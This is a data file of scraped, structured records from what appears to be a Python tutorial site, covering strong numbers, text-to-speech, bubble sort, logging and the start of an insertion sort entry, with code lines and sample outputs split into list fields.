120,['Strong Number in Python'],"['In this tutorial, we will learn a Python program to find a given number is a Strong number or not.']","['https://www.javatpoint.com/tower-of-hanoi-puzzle-using-python', 'https://www.javatpoint.com/how-to-sort-a-dictionary-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-for-loop', 'https://www.javatpoint.com/https://www.javatpoint.com/python-math-module', 'https://www.javatpoint.com/https://www.javatpoint.com/python-while-loop', 'https://www.javatpoint.com/tower-of-hanoi-puzzle-using-python', 'https://www.javatpoint.com/how-to-sort-a-dictionary-in-python', 'https://www.javatpoint.com/tower-of-hanoi-puzzle-using-python']",[],[],"['Strong Number Using the for loop', 'Python Program to find strong number using factorial function']","['What is a strong number?', 'Python Program to Find Strong Number']",[],"['A Strong number is a special number whose sum of the all digit factorial should be equal to the number itself.', 'For example - The given number is 145, we have to pick each digit and find the factorial 1! = 1, 4! = 24, and 5! = 120.', 'We got the logic of the strong number. Now implements it using the Python Program.', 'Problem Approach', 'Sample Input: num = 132', 'Sample Output: Given number is not a strong number', 'Explanation: 1! + 3! + 2! = 9 which is not equal to the 132', 'Sample Input: num = 145', 'Sample Output: Given number is a strong number.', 'Below is the code of the Python program to print the given number is a strong or not.', 'Explanation:', 'In the above code', 'Suppose user enter the value = 145 and sum = 0', 'Assigning initial values ', 'Now understand the loop iteration. First Iteration', 'Now, we entered in the nested while loop. It calculates the factorial of 5 is 120.', 'Second Iteration', 'Now, it enters into nested While loop. Here, it calculates the factorial of 4 = 24.', 'Third Iteration', 'The factorial of 1 is 1', 'Here, the temp = 0 so, the while loop condition fails.', 'We have complete the program using the while loop. We can also use for loop to find whether a given number is strong or not.', 'We can also find the strong number using for loop. The logic is the same as above program, the while loop is replaced by for loop.', 'Python math module provides the built-in math module. By using this method, we can omit the use of the nested while loop.', 'Explanation -', 'In the above code,']","['To find a whether given number is strong or not. We pick each digit from the given number and find its factorial, and we will do this every digit of the number.', 'Once we get the factorial of all digit, then we do the sum of factorials. If the sum is equal to the given number then the given number is strong otherwise not.', 'Now, we will do the sum of the factorials, we get 1+24+120 = 145, which is exactly the same as the given number. So we can say that 145 is a strong number.', 'If (num == sum) Now, we check the condition whether the user enter number is exactly equal to sum or not. If this condition returns True, then it is strong Number, else it is not Strong Number.']",[],"['# Variable to store sum of the numbers', '# Ask user to enter the number', 'num=int(input(""Enter a number:""))', '# temporary variable  store copy of the original number', 'temp=num', '# Using while loop', 'while(num):', '# intialize with 1', 'i=1', '# fact variable with 1', 'fact=1', 'rem=num%10', 'while(i<=rem):', 'fact=fact*i   # Find factorial of each number', 'i=i+1', 'sum=sum+fact', 'num=num//10', 'if(sum==temp):', 'print(""Given number is a strong number"")', 'print(""Given number is not a strong number"")', 'fact = 0', 'temp = num', 'temp = 145', 'rem = temp % 10', 'rem = 145 % 10 = 5', 'sum = sum + 120> 0+120', 'sum = 120', 'temp = temp//10 = 14', 'temp = 14', 'temp = 14,', 'sum = 120', 'rem = 14 % 10 = 4', 'sum = 120 + 24', 'sum = 144', 'temp = 14//10', 'temp = 1', 'temp = 1', 'sum = 144', 'rem = 1 % 10 = 0', 'sum = 144 + 1', 'sum = 145', 'temp = 1 / 10', 'temp = 0', '# Python Program to find Strong Number', 'num = int(input("" Enter the Number:""))', 'sum = 0', 'temp = num', 'while(temp > 0):', 'fact = 1', 'rem = temp % 10', 'for i in range(1, rem + 1):', 'fact = fact * i', 'print(""Factorial of %d = %d"" %(rem, fact))', 'sum = sum + fact', 'temp = temp // 10', 'print(""\\n Sum of Factorials of a Given Number %d = %d"" %(num, sum))', 'if (sum == num):', 'print("" The given number is a Strong Number"")', 'print("" The given number is not a Strong Number"")', '# Python Program to find Strong Number', 'import math', 'num = int(input("" Enter the Number:""))', 'sum = 0', 'temp = num', 'while(temp > 0):', 'rem = temp % 10', 'fact = math.factorial(rem)  # Using the buitlt-in factorial() function', 'print(""Factorial of %d = %d"" %(rem, fact))', 'sum = sum + fact', 'temp = temp // 10', 'print(""\\n Sum of Factorials of a Given Number %d = %d"" %(num, sum))', 'if (sum == num):', 'print("" The given number is a Strong Number"")', 'print("" The given number is not a Strong Number"")']","['Enter a number: 145', 'Given number is a strong number.', 'Enter the Number:145', 'Factorial of 5 = 120', 'Factorial of 4 = 24', 'Factorial of 1 = 1', 'Sum of Factorials of a Given Number 145 = 145', 'The given number is a Strong Number', 'Enter the Number: 145', 'Factorial of 5 = 120', 'Factorial of 4 = 24', 'Factorial of 1 = 1', 'Sum of Factorials of a Given Number 145 = 145', 'The given number is a Strong Number']",[],"[""|||We declared a variable integer value num for enter a number.|||Defined the sum variable with zero.|||A copy of the num value to the temp variable.|||In the first while loop, ensure that the given number is greater than 0.|||Inside the while loop, split the number and assigns the variable to find the factorial of each number.|||In the second while loop (nested while loop), finds the factorial of the each number.||||||We used the factorial() function and passed a reminder as an argument.|||In the first iteration of while loop, it returned the reminder 5 and passed to the factorial of 5.|||It will go on until the temp value is greater than zero. We don't need to use another while loop.|||&&&|||Ask the user to enter an integer number.|||Find the factorial of each digit in the number using the two while loop.|||Now, sum up all the factorial number.|||Check if it is equal to the given number.|||Print the Output.|||Exit|||""]"
121,['How to Convert Text to Speech in Python'],"['In this tutorial, we will learn how to convert the human language text into human-like speech.']","['https://www.javatpoint.com/bubble-sort-in-python', 'https://www.javatpoint.com/tower-of-hanoi-puzzle-using-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/api-full-form', 'https://www.javatpoint.com/bubble-sort-in-python', 'https://www.javatpoint.com/tower-of-hanoi-puzzle-using-python', 'https://www.javatpoint.com/bubble-sort-in-python']","['https://static.javatpoint.com/python/images/how-to-convert-text-to-speech-in-python.png', 'https://static.javatpoint.com/python/images/how-to-convert-text-to-speech-in-python2.png']",[],[],"['Installation of gTTS API', 'Python Program', 'The list of available languages', 'Offline API']",[],"['It is very easy to use the tool and provides many built-in functions which used to save the text file as an mp3 file.', 'However, as its latest update we cannot change the speech file; it will generate by the system and not changeable.', 'To convert text files into, we will use another offline library called pyttsx3.', 'Type the following command in the terminal to install the gTTS API.', 'Then, install the additional module to work with the gTTS.', 'and then install pyttsx3.', ""Let's understand the working of gTTS API"", 'As we can see that, it is very easy to use; we need to import it and pass the gTTS object that is an interface to the Google Translator API.', 'In the above line, we have sent the data in text and received the actual audio speech. Now, save this an audio file as welcome.mp3.', 'It will save it into a directory, we can listen this file as follow:', 'Please turn on the system volume, listen the text as we have saved earlier.', 'Now, we will define the complete Python program of text into speech.', 'Explanation:', 'In the above code, we have imported the API and use the gTTS function. The gTTS() function which takes three arguments -', 'We saved this file as exam.py, which can be accessible anytime, and then we have used the playsound() function to listen the audio file at runtime.', 'To get the available languages, use the following functions -', 'We have mentioned few important languages and their code. You can find almost every language in this library.', ""Let's understand how to use pyttsx3 library:"", ""It also provides some additional properties that we can use according to our needs. Let's get the details of speaking rate:"", 'If we pass the 100 then it will be slower.', 'Now, we can hear the text file in the voices.']","[""We don't need to use a neural network and train the model to covert the file into speech, as it is also hard to achieve. Instead, we will use these APIs to complete a task."", 'The gTTS API provides the facility to convert text files into different languages such as English, Hindi, German, Tamil, French, and many more. We can also play the audio speech in fast or slow mode.', 'We have used the Google API, but what if we want to convert text to speech using offline. Python provides the pyttsx3 library, which looks for TTS engines pre-installed in our platform.', 'In the above code, we have used the say() method and passed the text as an argument. It is used to add a word to speak to the queue, while the runAndWait() method runs the real event loop until all commands queued up.', 'In this tutorial, we have discussed the transformation of text file into speech using the third-party library. We also discussed the offline library. By using this, we can build own virtual assistance.']",['Sometimes we prefer listening to the content instead of reading. We can do multitasking while listening to the critical file data. Python provides many APIs to convert text to speech. The Google Text to Speech API is popular and commonly known as the gTTS API.'],"['pip install gTTS', 'pip install playsound', 'pip install pyttsx3', 'import gtts', 'from playsound import playsound', '# make a request to google to get synthesis', 't1 = gtts.gTTS(""Welcome to javaTpoint"")', '# save the audio file', 't1.save(""welcome.mp3"")', '# play the audio file', 'playsound(""welcome.mp3"")', '# Import the gTTS module for text', '# to speech conversion', 'from gtts import gTTS', '# This module is imported so that we can', '# play the converted audio', 'from playsound import playsound', '# It is a text value that we want to convert to audio', ""text_val = 'All the best for your exam.'"", '# Here are converting in English Language', ""language = 'en'"", '# Passing the text and language to the engine,', '# here we have assign slow=False. Which denotes', '# the module that the transformed audio should', '# have a high speed', 'obj = gTTS(text=text_val, lang=language, slow=False)', '#Here we are saving the transformed audio in a mp3 file named', '# exam.mp3', 'obj.save(""exam.mp3"")', '# Play the exam.mp3 file', 'playsound(""exam.mp3"")', 'import pyttsx3', '# initialize Text-to-speech engine', 'engine = pyttsx3.init()', '# convert this text to speech', 'text = ""Python is a great programming language""', 'engine.say(text)', '# play the speech', 'engine.runAndWait()', '# get details of speaking rate', 'rate = engine.getProperty(""rate"")', 'print(rate)', 'We can change rate of speed as we want:', '# setting new voice rate (faster)', 'engine.setProperty(""rate"", 300)', 'engine.say(text)', 'engine.runAndWait()', 'engine.setProperty(""rate"", 100)', 'engine.say(text)', 'engine.runAndWait()', '# get details of all voices available', 'voices = engine.getProperty(""voices"")', 'print(voices)']","[""{'af': 'Afrikaans', 'sq': 'Albanian', 'ar': 'Arabic', 'hy': 'Armenian', 'bn': 'Bengali', 'bs': 'Bosnian', 'ca': 'Catalan', 'hr': 'Croatian', 'cs': 'Czech', 'da': 'Danish', 'nl': 'Dutch', 'en': 'English', 'et': 'Estonian', 'tl': 'Filipino', 'fi': 'Finnish', 'fr': 'French', 'de': 'German', 'el': 'Greek', 'en-us': 'English (US)','gu': 'Gujarati', 'hi': 'Hindi', 'hu': 'Hungarian', 'is': 'Icelandic', 'id': 'Indonesian', 'it': 'Italian', 'ja': 'Japanese', 'en-ca': 'English (Canada)', 'jw': 'Javanese', 'kn': 'Kannada', 'km': 'Khmer', 'ko': 'Korean', 'la': 'Latin', 'lv': 'Latvian', 'mk': 'Macedonian', 'ml': 'Malayalam', 'mr', 'en-in': 'English (India)'}"", '200', '[<pyttsx3.voice.Voice object at 0x000002D617F00A20>, <pyttsx3.voice.Voice object at 0x000002D617D7F898>, <pyttsx3.voice.Voice object at 0x000002D6182F8D30>]']",[],['|||The first argument is a text value that we want to convert into a speech.|||The second argument is a specified language. It supports many languages. We can convert the text into the audio file.|||The third argument represents the speed of the speech. We have passed slow value as false; it means the speech will be at normal speed.|||']
122,['Bubble Sort in Python'],"['A Bubble sort is an easy algorithm among the various sorting algorithms. We learn it as a first sorting algorithm. It is easy to learn and highly intuitive. It can be easy to implement into the code, which is much beneficial for beginner software developers. But it is the worst algorithm for sorting the elements in every except because it checks every time the array is sorted or not.']","['https://www.javatpoint.com/logging-in-python', 'https://www.javatpoint.com/how-to-convert-text-to-speech-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/logging-in-python', 'https://www.javatpoint.com/how-to-convert-text-to-speech-in-python', 'https://www.javatpoint.com/logging-in-python']",[],[],"['Concept of Bubble Sort', 'Implementation in Python Code', 'Optimization of Python Code Implementation', 'Time Comparison']",['Without using a temp variable'],[],"[""Let's understand the concepts of the bubble sort."", ""Let's understand it by an example -"", 'We are creating a list of element, which stores the integer numbers', 'list1 = [5, 3, 8, 6, 7, 2]', 'Here the algorithm sort the elements -', 'First iteration ', 'It compares the first two elements and here 5>3 then swap with each other. Now we get new list is - ', '[3, 5, 8, 6, 7, 2]', 'In second comparison, 5 < 8 then swapping happen -', '[3, 5, 8, 6, 7, 2]', 'In third comparison, 8>6 then swap -', '[3, 5, 6, 8, 7, 2]', 'In fourth comparison, 8>7 then swap -', '[3, 5, 6, 7, 8, 2]', 'In fifth comparison, 8>2 then swap-', '[3, 5, 6, 7, 2, 8]', 'Here the first iteration is complete and we get the largest element at the end. Now we need to the len(list1) - 1', 'Second Iteration', '[3, 5, 6, 7, 2, 8] - > [3, 5, 6, 7, 2, 8] here, 3<5 then no swap taken place', '[3, 5, 6, 7, 2, 8] - > [3, 5, 6, 7, 2, 8] here, 5<6 then no swap taken place', '[3, 5, 6, 7, 2, 8] - > [3, 5, 6, 7, 2, 8] here, 6<7 then no swap taken place', '[3, 5, 6, 7, 2, 8] - > [3, 5, 6, 2, 7, 8] here 7>2 then swap their position. Now', '[3, 5, 6, 2, 7, 8] - > [3, 5, 6, 2, 7, 8] here 7<8 then no swap taken place.', 'Third Iteration', '[3, 5, 6, 2, 7, 8] - > [3, 5, 6, 7, 2, 8] here, 3<5 then no swap taken place', '[3, 5, 6, 2, 7, 8] - > [3, 5, 6, 7, 2, 8] here, 5<6 then no swap taken place', '[3, 5, 6, 2, 7, 8] - > [3, 5, 2, 6, 7, 8] here, 6<2 then swap their positions', '[3, 5, 2, 6, 7, 8] - > [3, 5, 2, 6, 7, 8] here 6<7 then no swap taken place. Now', '[3, 5, 2, 6, 7, 8] - > [3, 5, 2, 6, 7, 8] here 7<8 then swap their position.', 'It will iterate until the list is sorted.', 'Fourth Iteration -', '[3, 5, 2, 6, 7, 8] - > [3, 5, 2, 6, 7, 8]', '[3, 5, 2, 6, 7, 8] - > [3, 2, 5, 6, 7, 8]', '[3, 2, 5, 6, 7, 8] - > [3, 2, 5, 6, 7, 8]', '[3, 2, 5, 6, 7, 8] - > [3, 2, 5, 6, 7, 8]', '[3, 2, 5, 6, 7, 8] - > [3, 2, 5, 6, 7, 8]', 'Fifth Iteration', 'Check the each element and as we can see that our list is sorted using the bubble sort technique.', 'We have already described the technique of bubble sort. Now, we will implement the logic in the Python code.', 'Explanation:', 'In the above code, we have defined a bubble_sort() function which takes list1 as an argument.', 'We can also swap the elements without using the temp variable. Python has a very unique syntax. We can use the following lines of code.', 'We can prevent the unnecessary evaluation using the Boolean flag and checks if any swaps were made in the previous section.', 'In the second technique, we consider the fact that the iteration is ended when the largest element of the list end up at the end of the list.', ""Let's see the time comparison between the above code snippets.""]","[""We can optimize the above code using the two techniques. The swaps are not done; it means list is sorted. In the previous technique - The previous technique will evaluate the complete list though it doesn't seem necessary to do."", 'The first time, we pass the largest element at the end position using the n position. The second time, we pass through the n-1 position, the second largest element.', 'In each consecutive iteration, we can compare at one less element than before. More accurately, in the k-th iteration, only need to compare at the first n - k + 1 elements:', 'All techniques are useful for the fewer elements, but if the list consists of many elements, then the second optimize technique make a huge difference.']","['The bubble sort uses a straightforward logic that works by repeating swapping the adjacent elements if they are not in the right order. It compares one pair at a time and swaps if the first element is greater than the second element; otherwise, move further to the next pair of elements for comparison. ']","['# Creating a bubble sort function', 'def bubble_sort(list1):', '# Outer loop for traverse the entire list', 'for i in range(0,len(list1)-1):', 'for j in range(len(list1)-1):', 'if(list1[j]>list1[j+1]):', 'temp = list1[j]', 'list1[j] = list1[j+1]', 'list1[j+1] = temp', 'return list1', 'list1 = [5, 3, 8, 6, 7, 2]', 'print(""The unsorted list is: "", list1)', '# Calling the bubble sort function', 'print(""The sorted list is: "", bubble_sort(list1))', 'def bubble_sort(list1):', '# Outer loop for traverse the entire list', 'for i in range(0,len(list1)-1):', 'for j in range(len(list1)-1):', 'if(list1[j]>list1[j+1]):', '# here we are not using temp variable', 'list1[j],list1[j+1] = list1[j+1], list1[j]', 'return list1', 'list1 = [5, 3, 8, 6, 7, 2]', 'print(""The unsorted list is: "", list1)', '# Calling the bubble sort function', 'print(""The sorted list is: "", bubble_sort(list1))', 'def bubble_sort(list1):', '# We can stop the iteration once the swap has done', 'has_swapped = True', 'while(has_swapped):', 'has_swapped = False', 'for i in range(len(list1) - 1):', 'if list1[i] > list1[i+1]:', '# Swap', 'list1[i], list1[i+1] = list1[i+1], list1[i]', 'has_swapped = True', 'return list1', 'list1 = [5, 3, 8, 6, 7, 2]', 'print(""The unsorted list is: "", list1)', '# Calling the bubble sort function', 'print(""The sorted list is: "", bubble_sort(list1))', 'def bubble_sort(list1):', 'has_swapped = True', 'total_iteration = 0', 'while(has_swapped):', 'has_swapped = False', 'for i in range(len(list1) - total_iteration - 1):', 'if list1[i] > list1[i+1]:', '# Swap', 'list1[i], list1[i+1] = list1[i+1], list1[i]', 'has_swapped = True', 'total_iteration += 1', 'print(""The number of iteraton: "",total_iteration)', 'return list1', 'list1 = [5, 3, 8, 6, 7, 2]', 'print(""The unsorted list is: "", list1)', '# Calling the bubble sort funtion', 'print(""The sorted list is: "", bubble_sort(list1))', 'Unoptimized Bubble Sort Takes: 0.0106407', 'Optimize Bubble Sort Takes: 0.0078251', 'Bubble Sort with a Boolean flag and shortened list Takes: 0.0075207']","['The unsorted list is:  [5, 3, 8, 6, 7, 2]', 'The sorted list is:  [2, 3, 5, 6, 7, 8]', 'The unsorted list is:  [5, 3, 8, 6, 7, 2]', 'The sorted list is:  [2, 3, 5, 6, 7, 8]', 'The unsorted list is:  [5, 3, 8, 6, 7, 2]', 'The sorted list is:  [2, 3, 5, 6, 7, 8]', 'The unsorted list is:  [5, 3, 8, 6, 7, 2]', 'The number of iteraton:  6', 'The sorted list is:  [2, 3, 5, 6, 7, 8]']",[],"['|||Inside the function, we have defined two for loop - first for loop iterates the complete list and the second for loop iterates the list and the compare the two elements in every outer loop iterations.|||The for loop will be terminated when it reaches at the end.|||We have defined the condition in the inner for loop; if a first index value is greater than the second index value, swap their positions with each other.|||We called the function and passed a list; it iterated and returned the sorted list.|||']"
123,['Logging in Python'],"['In this tutorial, we will learn the fundamentals of the standard logging module.']","['https://www.javatpoint.com/insertion-sort-in-python', 'https://www.javatpoint.com/bubble-sort-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://docs.python.org/3/library/logging.html#logging.basicConfig', 'https://www.javatpoint.com/insertion-sort-in-python', 'https://www.javatpoint.com/bubble-sort-in-python', 'https://www.javatpoint.com/insertion-sort-in-python']",[],[],"['What is logging?', 'How Logging Works', 'Basic Configurations', 'Formatting the Output', 'Logging Variable Data', 'Capturing Stack Traces', 'Classes and Functions', 'Work With Handlers', 'Conclusion']",[],[],"['To releasing a log message, we need to import the logging module as follows.', 'The above levels are sufficient to handle any types of problems. These corresponding numerical values of the levels are given below.', ""Let's have a look at the several logger objects offered by the module itself."", ""Let's understand the following example."", 'Explanation:', 'It accepts some of the commonly used argument as follows.', ""Let's understand the following example."", 'Explanation:', ""Let's understand the following example."", 'Explanation:', 'The above code will generate a file, and we can see the output while opening a file.', 'The format argument can accept a string with Logrecord attributes in any form as we require.', ""Let's understand the following example -"", 'But instead of that, we can also use a format string for the message and appending the variable data as an argument.', ""Let's understand the following example -"", 'Explanation:', 'The arguments passed to the method would be convoluted as variable data in the message.', 'We can use the f{string} to format the given string. It provides a short and easy way to handle the string.', ""Let's understand the following example -"", 'Explanation:', ""Let's understand the following example."", 'We can use any of one option in error(), debug(), or critical() methods to get information about the exception.', 'Below are the classes and functions defined in the logging module.', ""If we don't have the message to format, the default is to use the raw message. The default format date format is."", 'The following format is used to make the log message in the human -readable format.', ""Let's understand the following example:"", 'Explanation:', ""Let's understand the following example of creating handlers."", 'Explanation:', 'The e_handler is a file handler with the level ERROR. It disregards the LogRecord as its level WARNING.', 'It also provides basic logging for small projects.', 'In this tutorial, we have discussed all the essential concepts of the logging module. We have covered generate messages with different levels.']","['Logging is a Python module in the standard library that provides the facility to work with the framework for releasing log messages from the Python programs. Logging is used to tracking events that occur when the software runs.', 'This module is widely used by the developers when they work to logging. It is very important tool which used in software development, running, and debugging.', 'Logging is beneficial to store the logging records. Suppose there is no logging record, and the program is interrupted during its execution, we will be unable to find the actual cause of the problem.', 'Somehow, we detect the cause of the crash but it will consume a lot of time to resolve this. Using the logging, we can leave a trace of breadcrumbs so that if the problem happens in the program, we can find the cause of the problem easily.', 'We can face many problems while running applications such as we suppose an integer, and we have been given a float, the service is under maintenance and many more. These problems are hard to determine and time-consuming.', 'The logging is a powerful module used by the beginners as well as enterprises. This module provides a proficiency to organize different control handlers and a transfer log messages to these handlers.', 'The logging module offers many features. It consists of several constants, classes, and methods. The constants are represented by the all caps latter; the classes are represented by capital letters. The items with lowercase represent methods.', ""We can notice that the debug() and info() message didn't display messages because, by default, the log module logs the messages with a severity level of WARNING, ERROR and CRITICAL."", 'The main task of logging is to store the records events in a file. The logging module provides the basicConfig(**kwarg), used to configure the logging.', 'We can set the level of log messages by using the level parameter as we want to record. We need to pass the one constant in the class, which would permit all logging calls.', ""Similarly, we can log the message to a file instead of display on console, filename and filemode can be used in the basicConfig() function, and we can decide the format of the message using format attributes. Let's understand the following example."", ""A string passed in the program as a message to log can be modified according to our requirements. There are some basic elements in the given string and part of the Logrecord. Let's understand the following example."", 'The %(asctime) attributes adds the time creation of the Logrecord. We can also customize the format using datefmt attributes, which provides the same function as the datetime module.', 'Sometimes, we want to include the dynamic information from the application in the log. The logging methods are accepted a string as an argument, and it is good practice to format a string with the variable data and passed to a log method.', 'We can capture the full stacks of traces in an application using the logging module. There is an exc_info parameter in the logging function; if we set it as True, it can capture the Exception information.', ""If we don't set true to exc_info, the output will not inform us about the exception. It would be hard to debug an error in thousand lines of code, if it displays only the following output."", 'We generally work with the objects of the Logger class, which are created using the logging.getLogger(name) function. If the getLogger() method is called multiple times with the same name, it will return the reference of the same logger object.', 'We have created the own logger name first_logger, but unlike the root logger, the first_logger is not part of the output format. To display it, pass it into the configuration function. Then the output will look like as follows.', 'Handlers are generally used to configure logger and transmit the logs to the many places at a time. It sends the log messages to the standard output stream or a file over HTTP or on email.', 'In the following program, we have created a custom logger named the logger_obj and created a LogRecord that stores the all record of the logging events and passed it to all the Handlers that it has: w_handlers and e_handlers.', 'The w_handlers is a stream handler with the level WARNING. It accepts the log from the LogRecord to generate the output in the format string and print it to the screen.']","[""Now, we will call the logger to log messages that we want to see. The logging module offers the five levels that specify the severity of events. Each event contains the parallel methods that can be used to log events at the level of severity. Let's understand the following events and their working."", 'As we can see in the above output, each message is displayed along with the root, which is the logging module name given to its default logger. The message and the level name are separated by a colon (:) and print the messages in default output format.', 'The above output will be displayed in the msg.log file instead of console. We opened the file in w, which means the file is opened in the ""write mode"". If the basicConfig() is called multiple times, then each run of the program will rewrite the log file\'s output. The basicConfig() function can be modified by passing the additional arguments (https://docs.python.org/3/library/logging.html#logging.basicConfig).', 'There is also other option to get complete information about the exception. The logging module provides the exception() method, which logs a message with ERROR and attaches the exception information. To use it, call the logging.exception() method same as calling logging.error(exc_info = True).', 'We have seen so far the default logger called root. The logging module is used it whenever its functions are called such as logging.debug(), logging.error(), etc. We can also define own logger by creating an object of the Logger class. Here, we are defining the commonly used classes and functions.', 'The logging module is flexible and easy to use. It is very useful for keeping track of the logging records and displaying the appropriate message to the user. It provides the flexibility to create custom log levels, handler classes, and many other useful methods.']","['import logging', 'import logging', ""logging.debug('The debug message is displaying')"", ""logging.info('The info message is displaying')"", ""logging.warning('The warning message is displaying')"", ""logging.error('The error message is displaying')"", ""logging.critical('The critical message is displaying')"", 'import logging', 'logging.basicConfig(level=logging.DEBUG)', ""logging.debug('The dubug message is logged')"", 'DEBUG:root: The debug will be get logged', 'import logging', ""logging.basicConfig(filename='msg.log', filemode='w', format='%(name)s - %(levelname)s - %(message)s')"", ""logging.warning('This will get logged to a file')"", 'root - WARNING - This will get logged to a file', 'import logging', '#Create and configure logger using the basicConfig() function', 'logging.basicConfig(filename=""newfile.log"",', ""format='%(asctime)s %(message)s',"", ""filemode='w')"", '#Creating an object of the logging', 'logger=logging.getLogger()', '#Setting the threshold of logger to DEBUG', 'logger.setLevel(logging.DEBUG)', '#Test messages', 'logger.debug(""This is a harmless debug Message"")', 'logger.info(""This is just an information"")', 'logger.warning(""It is a Warning. Please make changes"")', 'logger.error(""You are trying to divide by zero"")', 'logger.critical(""Internet is down"")', 'import logging', ""logging.basicConfig(format='%(process)d-%(levelname)s-%(message)s')"", ""logging.warning('This is a Warning Message')"", 'import logging', ""logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)"", ""logging.info('Admin logged in')"", 'import logging', ""logging.basicConfig(format='%(asctime)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S')"", ""logging.warning('Admin logged out')"", 'import logging', ""name = 'Peter Decosta'"", ""logging.error('%s raised an error', name)"", 'import logging', ""name = 'Antonio Mino'"", ""logging.error(f'{name} raised an error')"", 'import logging', 'c = a / b', 'except Exception as e:', 'logging.error(""Exception occurred"", exc_info=True)', 'ERROR:root:Exception occurred', 'import logging', 'c = a / b', 'except Exception as e:', 'logging.exception(""Exception occurred"", exc_info=True)', '%Y-%m-%d %H:%M:%S', ""'%(asctime)s - %(levelname)s - %(message)s'"", 'import logging', ""logger = logging.getLogger('first_logger')"", ""logger.warning('This is a warning message')"", 'WARNING:first_logger:This is a warning message', 'import logging', '# Create a custom logger_obj', 'logger_obj = logging.getLogger(__name__)', '# Create handlers', 'w_handler = logging.StreamHandler()', ""e_handler = logging.FileHandler('file.log')"", 'w_handler.setLevel(logging.WARNING)', 'e_handler.setLevel(logging.ERROR)', '# Create formatters and add it to handlers', ""c_format = logging.Formatter('%(name)s - %(levelname)s - %(message)s')"", ""f_format = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')"", 'w_handler.setFormatter(c_format)', 'e_handler.setFormatter(f_format)', '# Add handlers to the logger_obj', 'logger_obj.addHandler(w_handler)', 'logger_obj.addHandler(e_handler)', ""logger_obj.warning('This is a warning message')"", ""logger_obj.error('This is an error message')""]","['WARNING:root:The warning message is displaying', 'ERROR:root:The error message is displaying', 'CRITICAL:root:The critical message is displaying', '2020-09-05 13:17:39,204 This is a harmless debug Message', '2020-09-05 13:17:39,205 This is just an information', '2020-09-05 13:17:39,205 It is a Warning. Please make changes', '2020-09-05 13:17:39,205 You are trying to divide by zero', '2020-09-05 13:17:39,205 Internet is down', '18472-WARNING-This is a Warning Message', '2020-09-02 20:12:06,288 - Admin logged in', '02-Sep-20 13:29:05 - Admin logged out', 'ERROR:root: Peter Decosta raised an error', 'ERROR:root: Antonio Mino raised an error', 'ERROR:root:Exception occurred', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/loggingFile.py"", line 224, in <module>', 'c = a / b', 'ZeroDivisionError: division by zero', 'ERROR:root:Exception occurred', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/loggingFile.py"", line 224, in <module>', 'c = a / b', 'ZeroDivisionError: division by zero', 'This is a warning message', '__main__ - WARNING - This is a warning message', '__main__ - ERROR - This is an error message']",['Level|||Numeric Values&&&NOTSET|||0&&&DEBUG|||10&&&INFO|||20&&&WARNING|||30&&&ERROR|||40&&&CRITICAL|||50'],"[""|||Logger.info(msg) : It is used to log a message with level INFO on this logger.|||Logger.warning(msg) : It is used to log a message with level WARNING on this logger.|||Logger.error(msg) : It is used to log a message with level ERROR on this logger.|||Logger.critical(msg) : It is used to log a message with level CRITICAL on this logger.|||Logger.log(lvl,msg) : It is used to logs a message with integer level lvl on this logger.|||Logger.exception(msg) : It is used to log a message with level ERROR on this logger.|||Logger.setLevel(lvl) : It is used to sets the beginning of this logger to lvl. It will ignore all the messages which are written below.|||Logger.addFilter(filt) : It is used to add a specific filter filt to the to this logger.|||Logger.removeFilter(filt) : It is used to eliminates a specific filter filt to the to this logger.|||Logger.filter(record) : It put on the filter of logger to the record. If the record available and to be handled then returns True. Otherwise, it will return False.|||Logger.addHandler(hdlr) : It is used to add a particular handler hdlr to the to this logger.|||Logger.removeHandler(hdlr) : It is used to eliminate a particular handler hdlr to this logger.|||Logger.hasHandlers() : It is used to verify if the logger contains any handler configured or not.||||||level - The specified severity level is set by the root level.|||filename - It specifies a file.|||filemode - It opens a file in a specific mode. The default mode of the opening file is a, which means we can append the content.|||format - The format defines the format of the log message.||||||Logger - The logger object is used to call the functions directly.|||LogRecord - It creates automatically log record file which consists the information related to all event of being logged such as the logger's name, the function, the line number, the message, and more.|||Handler - The handlers are used to dispatch the LogRecord to the output endpoint. The FileHandler, StreamHandler, HTTPHandler, SMTTPHandler are the subclasses of a Handler.|||Formatters - The formatters are used to define the structure of the output. It is used the string formatting methods to specify the format of the log messages.|||&&&|||DEBUG - It is used to provide detailed information and only use it when there is diagnosing problems.|||INFO - It provides the information regarding that things are working as we want.|||WARNING - It is used to warn that something happened unexpectedly, or we will face the problem in the upcoming time.|||ERROR - It is used to inform when we are in some serious trouble, the software hasn't executed some programs.|||CRITICAL - It specifies the serious error, the program itself may be incapable of remaining executing.|||""]"
124,['Insertion Sort in Python'],"['The Insertion sort is a straightforward and more efficient algorithm than the previous bubble sort algorithm. The insertion sort algorithm concept is based on the deck of the card where we sort the playing card according to a particular card. It has many advantages, but there are many efficient algorithms available in the data structure.']","['https://www.javatpoint.com/binary-search-in-python', 'https://www.javatpoint.com/logging-in-python', 'https://www.javatpoint.com/binary-search-in-python', 'https://www.javatpoint.com/logging-in-python', 'https://www.javatpoint.com/binary-search-in-python']",[],[],"['The Concept of Insertion Sort', 'Implementation', 'Sorting Custom Objects', 'Time Complexity in Insertion Sort', 'Conclusion']","['What is the meaning of in-place and stable?', 'Python Program']",[],"['The insertion sort algorithm is not so fast because of it uses nested loop for sort the elements.', ""Let's understand the following terms."", ""The more important thing, the insertion sort doesn't require to know the array size in advance and it receives the one element at a time."", ""It is more efficient for the small (less than 10) size array. Now, let's understand the concepts of insertion sort."", 'The array spilled virtually in the two parts in the insertion sort - An unsorted part and sorted part.', 'It focuses on inserting the elements by moving all elements if the right-side value is smaller than the left side.', 'It will repeatedly happen until the all element is inserted at correct place.', 'To sort the array using insertion sort below is the algorithm of insertion sort.', ""Let's understand the following 